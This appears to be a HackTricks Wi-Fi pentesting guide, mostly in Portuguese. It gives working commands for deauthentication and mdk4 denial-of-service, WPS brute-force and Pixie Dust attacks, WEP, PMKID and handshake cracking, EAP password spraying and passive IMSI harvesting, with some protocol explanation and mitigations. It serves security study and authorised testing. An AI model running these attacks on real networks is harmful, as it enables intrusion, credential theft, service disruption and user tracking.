# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Comandos básicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Ferramentas

### Hijacker & NexMon (Wi-Fi interno do Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Executar airgeddon com docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Pode executar ataques Evil Twin, KARMA e Known Beacons e, em seguida, usar um phishing template para obter a senha real da rede ou capturar credenciais de redes sociais.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta ferramenta automatiza ataques **WPS/WEP/WPA-PSK**. Ela irá automaticamente:

- Colocar a interface em monitor mode
- Fazer scan por redes possíveis - e permitir que você selecione a(s) vítima(s)
- Se WEP - Lançar ataques WEP
- Se WPA-PSK
- Se WPS: Pixie dust attack e o bruteforce attack (cuidado: o brute-force attack pode levar muito tempo). Observe que ele não tenta null PIN ou database/generated PINs.
- Tenta capturar o PMKID do AP para crackar
- Tenta deauthenticate clientes do AP para capturar um handshake
- Se PMKID ou Handshake, tenta bruteforce usando top5000 passwords.

## Resumo de Ataques

- **DoS**
- Deauthentication/disassociation -- Desconectar todo mundo (ou um ESSID/Client específico)
- Random fake APs -- Ocultar redes, possível travamento de scanners
- Overload AP -- Tentar derrubar o AP (geralmente não muito útil)
- WIDS -- Interagir com o IDS
- TKIP, EAPOL -- Alguns ataques específicos para realizar DoS em alguns APs
- **Cracking**
- Crack **WEP** (várias ferramentas e métodos)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] captura de **WPA handshake** + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Útil para capturar captive portal creds e/ou realizar ataques LAN
- **WPA-PSK** Evil Twin -- Útil para ataques de rede se você souber a senha
- **WPA-MGT** -- Útil para capturar credenciais da empresa
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Útil para capturar captive portal creds e/ou realizar ataques LAN
- **+ WPA** -- Útil para capturar WPA handshakes

## Notas rápidas sobre redes Open / OWE

- **Passive capture** em SSIDs open ainda funciona com monitor mode e tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) realiza uma troca de chaves por estação (sem PSK), então air frames são criptografados mesmo em SSIDs "open". Sendo WPA3-based, também aplica **802.11w PMF**, que bloqueia frames de deauth/disassoc forjados.
- OWE **does not authenticate** joiners: qualquer pessoa pode associar-se, então **verify client isolation** em vez de confiar em claims de marketing. Sem isolamento, ARP spoofing ou responder-style poisoning no L2 local ainda funcionam.
- **Evil Twin** permanece viável em SSIDs open/OWE ao apresentar um sinal mais forte; PMF apenas remove o atalho de deauth. Se as vítimas aceitarem um TLS cert forjado, o MitM HTTP(S) completo é recuperado.
- Broadcast poisoning em guest Wi-Fi open facilmente rende creds/hashes (LLMNR/NBT-NS/mDNS). Veja:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Descrição de** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, um método prevalente em Wi-Fi hacking, envolvem forjar "management" frames para **desconectar forçadamente dispositivos de uma rede**. Esses pacotes não criptografados enganam os clientes fazendo-os acreditar que vêm da rede legítima, permitindo que atacantes coletem WPA handshakes para fins de cracking ou interrompam persistentemente conexões de rede. Tática alarmante em sua simplicidade, é amplamente usada e tem implicações significativas para a segurança de redes.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 significa deauthentication
- 1 é o número de deauths a enviar (você pode enviar múltiplos se desejar); 0 significa enviá-los continuamente
- -a 00:14:6C:7E:40:80 é o endereço MAC do ponto de acesso
- -c 00:0F:B5:34:30:30 é o endereço MAC do cliente a ser deauthenticated; se isso for omitido então é enviado broadcast deauthentication (nem sempre funciona)
- ath0 é o nome da interface

### Disassociation Packets

**Disassociation packets**, semelhantes a deauthentication packets, são um tipo de quadro de gerenciamento usado em redes Wi‑Fi. Esses pacotes servem para romper a conexão entre um dispositivo (como um laptop ou smartphone) e um ponto de acesso (AP). A principal distinção entre disassociation e deauthentication reside nos cenários de uso. Enquanto um AP emite **deauthentication packets para remover explicitamente rogue devices da rede, disassociation packets são tipicamente enviados quando o AP está passando por um desligamento**, reinicialização ou realocação, exigindo assim a desconexão de todos os nós conectados.

**Este ataque pode ser realizado por mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Mais DOS attacks por mdk4**

**Em** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Envia beacon frames para mostrar fake APs aos clients. Isso, às vezes, pode causar crash em network scanners e até drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Enviar authentication frames para todos os Access Points (APs) acessíveis dentro do alcance pode sobrecarregar esses APs, especialmente quando numerosos clients estão envolvidos. Esse tráfego intenso pode levar à instabilidade do sistema, fazendo com que alguns APs travem ou até reiniciem.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODO DE ATAQUE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) verifica se um SSID é corretamente revelado e confirma o alcance do AP. Essa técnica, combinada com **bruteforcing hidden SSIDs** com ou sem uma wordlist, ajuda a identificar e acessar redes ocultas.

**MODO DE ATAQUE m: Michael Countermeasures Exploitation**

Enviar pacotes aleatórios ou duplicados para diferentes filas QoS pode acionar Michael Countermeasures em **TKIP APs**, levando a um desligamento do AP por um minuto. Esse método é uma tática eficiente de ataque **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODO DE ATAQUE e: EAPOL Start and Logoff Packet Injection**

Inundar um AP com **EAPOL Start frames** cria **sessões falsas**, sobrecarregando o AP e bloqueando clientes legítimos. Alternativamente, injetar **mensagens EAPOL Logoff falsas** desconecta forçosamente os clientes — ambos os métodos interrompem efetivamente o serviço de rede.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Ataques para redes mesh IEEE 802.11s**

Vários ataques ao gerenciamento de link e ao roteamento em redes mesh.

**ATTACK MODE w: Confusão do WIDS**

A conexão cruzada de clientes a múltiplos nós WDS ou a rogue APs falsos pode manipular Sistemas de Detecção e Prevenção de Intrusões, criando confusão e potencial abuso do sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

A packet fuzzer com diversas fontes de pacotes e um conjunto abrangente de modificadores para manipulação de pacotes.

### **Airggedon**

_**Airgeddon**_ oferece a maioria dos ataques propostos nos comentários anteriores:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) simplifica o processo de conectar dispositivos a um roteador, aumentando a velocidade e a facilidade de configuração para redes criptografadas com **WPA** ou **WPA2** Personal. É ineficaz contra a segurança WEP, facilmente comprometida. WPS emprega um PIN de 8 dígitos, validado em duas metades, tornando-o suscetível a brute-force devido ao número limitado de combinações (11.000 possibilidades).

### WPS Bruteforce

Existem 2 ferramentas principais para realizar essa ação: Reaver e Bully.

- **Reaver** foi projetado para ser um ataque robusto e prático contra WPS, e foi testado contra uma grande variedade de access points e implementações WPS.
- **Bully** é uma **new implementation** do ataque de brute force WPS, escrita em C. Possui várias vantagens sobre o código original do reaver: menos dependências, desempenho de memória e CPU melhorado, tratamento correto de endianness e um conjunto de opções mais robusto.

O ataque explora a **WPS PIN's vulnerability**, particularmente a exposição dos quatro primeiros dígitos e o papel do último dígito como checksum, facilitando o brute-force. No entanto, defesas contra brute-force, como **blocking MAC addresses** de atacantes agressivos, exigem **MAC address rotation** para continuar o ataque.

Ao obter o WPS PIN com ferramentas como Bully ou Reaver, o atacante pode deduzir o WPA/WPA2 PSK, garantindo **acesso persistente à rede**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Esta abordagem refinada tem como alvo WPS PINs usando vulnerabilidades conhecidas:

1. **Pre-discovered PINs**: Utilize um banco de dados de PINs conhecidos vinculados a fabricantes específicos conhecidos por usar WPS PINs uniformes. Esse banco de dados correlaciona os três primeiros octetos de MAC-addresses com os PINs prováveis para esses fabricantes.
2. **PIN Generation Algorithms**: Aproveite algoritmos como ComputePIN e EasyBox, que calculam WPS PINs com base no MAC-address do AP. O algoritmo Arcadyan adicionalmente requer um device ID, adicionando uma camada ao processo de geração de PIN.

### WPS Pixie Dust attack

**Dominique Bongard** descobriu uma falha em alguns Access Points (APs) relacionada à criação de códigos secretos, conhecidos como **nonces** (**E-S1** e **E-S2**). Se esses nonces puderem ser descobertos, quebrar o WPS PIN do AP se torna fácil. O AP revela o PIN dentro de um código especial (hash) para provar que é legítimo e não um AP falso (rogue). Esses nonces são essencialmente as "chaves" para abrir o "cofre" que contém o WPS PIN. More on this can be found [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Em termos simples, o problema é que alguns APs não usavam chaves suficientemente aleatórias para criptografar o PIN durante o processo de conexão. Isso torna o PIN vulnerável a ser adivinhado a partir de fora da rede (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Se você não quiser colocar o dispositivo em monitor mode, ou se `reaver` e `bully` tiverem algum problema, você pode tentar [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Esta ferramenta pode realizar Pixie Dust attack sem precisar mudar para monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Alguns sistemas mal projetados até permitem que um **Null PIN** (um PIN vazio ou inexistente) conceda acesso, o que é bastante incomum. A ferramenta **Reaver** é capaz de testar essa vulnerabilidade, ao contrário do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos os ataques WPS propostos podem ser facilmente realizados usando _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 e 6 permitem que você tente **seu PIN personalizado** (se tiver algum)
- 7 e 8 executam o **Pixie Dust attack**
- 13 permite testar o **NULL PIN**
- 11 e 12 irão **recolher os PINs relacionados ao AP selecionado a partir de bases de dados disponíveis** e **gerar** possíveis **PINs** usando: ComputePIN, EasyBox e opcionalmente Arcadyan (recomendado, por que não?)
- 9 e 10 vão testar **todos os PINs possíveis**

## **WEP**

Por que ele falha

- RC4 seed é apenas **IV (24 bits) + shared key**. O IV está em texto claro, é pequeno (2^24) e se repete rapidamente, então ciphertexts com o mesmo IV reutilizam o keystream.
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; predictable headers + RC4 KSA biases (**FMS**) let you “vote” key bytes. **PTW** optimises this using ARP traffic to drop requirements to tens of thousands of packets instead of millions.
- Integrity is only **CRC32** (linear/unkeyed), so an attacker can flip bits and recompute CRC32 without the key → packet forgery/replay/ARP injection while waiting for IVs.

Practical break is deterministic:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon still ships an "All-in-One" WEP workflow if you prefer a guided UI.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a new attack method, unique because it only needs **one single packet** and doesn't require any clients to be connected to the target AP—just interaction between the attacker and the AP.

Many modern routers add an **optional field** to the **first EAPOL** frame during association, known as `Robust Security Network`. This includes the `PMKID`.

As the original post explains, the **PMKID** is created using known data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dado que o "PMK Name" é constante, sabemos o BSSID do AP e da station, e o `PMK` é idêntico ao do full 4-way handshake, **hashcat** pode usar essa informação para fazer crack no PSK e recuperar a passphrase!

Para **coletar** essa informação e **bruteforce** a senha localmente, você pode fazer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Os **PMKIDs captured** serão mostrados no **console** e também **salvos** dentro \_ **/tmp/attack.pcap**\_\
Agora, converta a capture para o formato **hashcat/john** e crackeie-o:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Note que o formato de um hash correto contém **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Se o seu **apenas** contém **3 partes**, então, é **inválido** (a captura PMKID não foi válida).

Observe que `hcxdumptool` **também captura handshakes** (algo assim aparecerá: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Você pode **transformar** os **handshakes** para o formato **hashcat**/**john** usando `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Percebi que alguns handshakes capturados com esta ferramenta não puderam ser cracked mesmo conhecendo a senha correta. Recomendo capturar handshakes também pela forma tradicional se possível, ou capturar vários deles usando esta ferramenta._

### Captura de handshake

Um ataque a redes **WPA/WPA2** pode ser executado capturando um **handshake** e tentando **crack** a senha **offline**. Esse processo envolve monitorar a comunicação de uma rede específica e o **BSSID** em um **channel** particular. Aqui está um guia simplificado:

1. Identifique o **BSSID**, o **channel**, e um **connected client** da rede alvo.
2. Use `airodump-ng` para monitorar o tráfego da rede no **channel** e **BSSID** especificados, na esperança de capturar um handshake. O comando ficará assim:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Para aumentar a probabilidade de capturar um handshake, desconecte momentaneamente o cliente da rede para forçar uma re-authentication. Isso pode ser feito usando o comando `aireplay-ng`, que envia deauthentication packets para o cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Observe que, como o cliente foi deauthenticated, ele pode tentar conectar-se a um AP diferente ou, em outros casos, a uma rede diferente._

Quando no `airodump-ng` aparecerem algumas informações de handshake, isso significa que o handshake foi capturado e você pode parar de escutar:

![](<../../images/image (172) (1).png>)

Uma vez que o handshake foi capturado, você pode **crack** com `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificar se há handshake no arquivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Se esta ferramenta encontrar um handshake incompleto de um ESSID antes do handshake completo, ela não detectará o handshake válido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Adivinhação online de PSK mais rápida via `wpa_supplicant` ctrl socket (sem clientes/PMKID)

Quando não há clientes por perto e o AP recusa PMKID, você pode testar PSKs online sem reiniciar supplicants:

- Faça um patch em `wpa_supplicant.c` para forçar `dur = 0;` na lógica de backoff de falha de autenticação (em torno de `ssid->auth_failures`), desativando efetivamente o timer de desativação temporária.
- Rode um único daemon com um control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Controle-o através da interface de controle, reutilizando o mesmo scan e network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Um pequeno loop em Python lendo eventos de socket (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) pode testar ~100 tentativas em ~5 minutos sem scan overhead. Ainda é barulhento e detectável, mas evita reinícios de processo por tentativa e atrasos de backoff.

## **WPA Enterprise (MGT)**

Em **configurações de WiFi empresarial, você encontrará vários métodos de autenticação**, cada um oferecendo diferentes níveis de segurança e recursos de gerenciamento. Ao usar ferramentas como `airodump-ng` para inspecionar o tráfego de rede, você pode notar identificadores para esses tipos de autenticação. Alguns métodos comuns incluem:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Este método suporta hardware tokens e one-time passwords dentro do EAP-PEAP. Ao contrário do MSCHAPv2, ele não usa um peer challenge e envia passwords em plaintext para o access point, apresentando risco de downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Envolve o envio do hash MD5 da password pelo cliente. Não é **recomendado** devido à vulnerabilidade a dictionary attacks, falta de server authentication e incapacidade de gerar WEP keys específicas por sessão.
3. **EAP-TLS (Transport Layer Security)**:
- Utiliza certificados no client-side e no server-side para autenticação e pode gerar dinamicamente user-based e session-based WEP keys para proteger as comunicações.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Fornece autenticação mútua através de um túnel encriptado, além de um método para derivar WEP keys dinâmicas por usuário e por sessão. Requer apenas certificados no server-side, com os clientes usando credenciais.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funciona de forma similar ao EAP, criando um TLS tunnel para comunicação protegida. Permite o uso de protocolos de autenticação mais fracos sobre o EAP devido à proteção oferecida pelo túnel.
- **PEAP-MSCHAPv2**: Frequentemente referido como PEAP, combina o mecanismo vulnerável de challenge/response do MSCHAPv2 com um TLS tunnel protetor.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Semelhante ao EAP-TLS, mas inicia um TLS tunnel antes da troca de certificados, oferecendo uma camada adicional de segurança.

You can find more information about these authentication methods [aqui ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)e [aqui](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Lendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que se você está usando **EAP** as mensagens **"Identity"** devem ser **suportadas**, e o **username** será enviado em **clear** nas mensagens **"Response Identity"**.

Mesmo usando um dos métodos de autenticação mais seguros: **PEAP-EAP-TLS**, é possível **capturar o username enviado no protocolo EAP**. Para isso, **capture uma comunicação de autenticação** (inicie `airodump-ng` dentro de um channel e `wireshark` na mesma interface) e filtre os pacotes por `eapol`.\
Dentro do pacote "**Response, Identity**", o **username** do cliente aparecerá.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding é suportado tanto por EAP-PEAP quanto por EAP-TTLS. No contexto de uma rede WiFi, um EAP-Identity request é tipicamente iniciado pelo access point (AP) durante o processo de association. Para garantir a proteção do anonimato do usuário, a resposta do EAP client no dispositivo do usuário contém apenas a informação essencial necessária para que o RADIUS server inicial processe o request. Esse conceito é ilustrado através dos seguintes cenários:

- EAP-Identity = anonymous
- Neste cenário, todos os usuários empregam o pseudônimo "anonymous" como identificador de usuário. O initial RADIUS server funciona como um servidor EAP-PEAP ou EAP-TTLS, responsável por gerenciar o lado server do protocolo PEAP ou TTLS. O método de autenticação interno (protegido) é então tratado localmente ou delegado a um RADIUS server remoto (home).
- EAP-Identity = anonymous@realm_x
- Nesta situação, usuários de diferentes realms ocultam suas identidades enquanto indicam seus respectivos realms. Isso permite que o initial RADIUS server proxy os requests EAP-PEAP ou EAP-TTLS para RADIUS servers em seus home realms, que atuam como o PEAP ou TTLS server. O initial RADIUS server opera unicamente como um RADIUS relay node.
- Alternativamente, o initial RADIUS server pode funcionar como o EAP-PEAP ou EAP-TTLS server e tratar o método de autenticação protegido ou encaminhá-lo para outro servidor. Essa opção facilita a configuração de políticas distintas para vários realms.

No EAP-PEAP, uma vez que o TLS tunnel é estabelecido entre o PEAP server e o PEAP client, o PEAP server inicia um EAP-Identity request e o transmite através do TLS tunnel. O client responde a esse segundo EAP-Identity request enviando uma EAP-Identity response contendo a verdadeira identidade do usuário através do túnel encriptado. Essa abordagem previne efetivamente a revelação da identidade real do usuário para qualquer um que esteja escutando o tráfego 802.11.

O EAP-TTLS segue um procedimento ligeiramente diferente. Com EAP-TTLS, o client tipicamente autentica usando PAP ou CHAP, protegido pelo TLS tunnel. Nesse caso, o client inclui um atributo User-Name e ou um atributo Password ou CHAP-Password na mensagem TLS inicial enviada após o estabelecimento do túnel.

Independentemente do protocolo escolhido, o PEAP/TTLS server obtém conhecimento da verdadeira identidade do usuário depois que o TLS tunnel foi estabelecido. A identidade real pode ser representada como user@realm ou simplesmente user. Se o PEAP/TTLS server também for responsável por autenticar o usuário, ele agora possui a identidade do usuário e procede com o método de autenticação protegido pelo TLS tunnel. Alternativamente, o PEAP/TTLS server pode encaminhar um novo RADIUS request para o home RADIUS server do usuário. Esse novo RADIUS request omite a camada do protocolo PEAP ou TTLS. Nos casos em que o método de autenticação protegido é EAP, as mensagens internas EAP são transmitidas para o home RADIUS server sem o wrapper EAP-PEAP ou EAP-TTLS. O atributo User-Name da mensagem RADIUS de saída contém a verdadeira identidade do usuário, substituindo o User-Name anonymous do RADIUS request de entrada. Quando o método de autenticação protegido é PAP ou CHAP (suportado apenas pelo TTLS), o User-Name e outros atributos de autenticação extraídos do payload TLS são substituídos na mensagem RADIUS de saída, desalojando o User-Name anonymous e os atributos TTLS EAP-Message presentes no RADIUS request de entrada.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Clique para expandir</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notas:
- Funciona antes de qualquer túnel TLS se a implantação usar EAP‑SIM/AKA sem identidade protegida/pseudônimos.
- O valor exposto é um identificador permanente vinculado ao SIM do assinante; sua coleta permite rastreamento de longo prazo e abusos subsequentes nas telecomunicações.

Impacto
- Privacidade: rastreamento persistente de usuário/dispositivo a partir de capturas passivas de Wi‑Fi em locais públicos.
- Base para abusos em telecomunicações: com o IMSI, um atacante com acesso a SS7/Diameter pode consultar a localização ou tentar interceptar chamadas/SMS e roubar MFA.

Mitigações / o que procurar
- Verifique que os clientes usam identidades externas anônimas (pseudônimos) para EAP‑SIM/AKA conforme orientação 3GPP (p.ex., 3GPP TS 33.402).
- Prefira tunelar a fase de identidade (p.ex., EAP‑TTLS/PEAP transportando o EAP‑SIM/AKA interno) para que o IMSI nunca seja enviado em claro.
- Capturas de pacotes da associação/autenticação nunca devem revelar um IMSI bruto em EAP-Response/Identity.

Relacionado: Exploração de sinalização em telecomunicações com identificadores móveis capturados
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Se espera que o cliente use um **username and password** (observe que **EAP-TLS won't be valid** neste caso), então você pode tentar obter uma **lista** de **usernames** (veja a parte seguinte) e **passwords** e tentar **bruteforce** o acesso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Você também pode realizar este ataque usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria de ataques a clientes

### Seleção de rede e roaming

- O protocolo 802.11 define como uma estação se junta a um Extended Service Set (ESS) mas não especifica os critérios para selecionar um ESS ou um access point (AP) dentro dele.
- Estações podem fazer roaming entre APs que compartilham o mesmo ESSID, mantendo conectividade através de um prédio ou área.
- O protocolo exige autenticação da estação ao ESS mas não obriga a autenticação do AP à estação.

### Listas de Redes Preferidas (PNLs)

- As estações armazenam o ESSID de cada rede sem fio à qual se conectam na sua Preferred Network List (PNL), junto com detalhes de configuração específicos da rede.
- A PNL é usada para conectar automaticamente a redes conhecidas, melhorando a experiência do usuário ao simplificar o processo de conexão.

### Varredura Passiva

- APs periodicamente transmitem beacon frames, anunciando sua presença e recursos, incluindo o ESSID do AP, a menos que a transmissão esteja desativada.
- Durante a varredura passiva, as estações escutam por beacon frames. Se o ESSID de um beacon corresponder a uma entrada na PNL da estação, a estação pode conectar-se automaticamente a esse AP.
- O conhecimento da PNL de um dispositivo permite exploração potencial ao imitar o ESSID de uma rede conhecida, enganando o dispositivo a se conectar a um rogue AP.

### Sondagem Ativa

- A sondagem ativa envolve estações enviando probe requests para descobrir APs próximos e suas características.
- Directed probe requests têm como alvo um ESSID específico, ajudando a detectar se uma rede particular está ao alcance, mesmo que seja uma rede oculta.
- Broadcast probe requests possuem um campo SSID nulo e são enviados a todos os APs próximos, permitindo que a estação verifique qualquer rede preferida sem revelar o conteúdo da sua PNL.

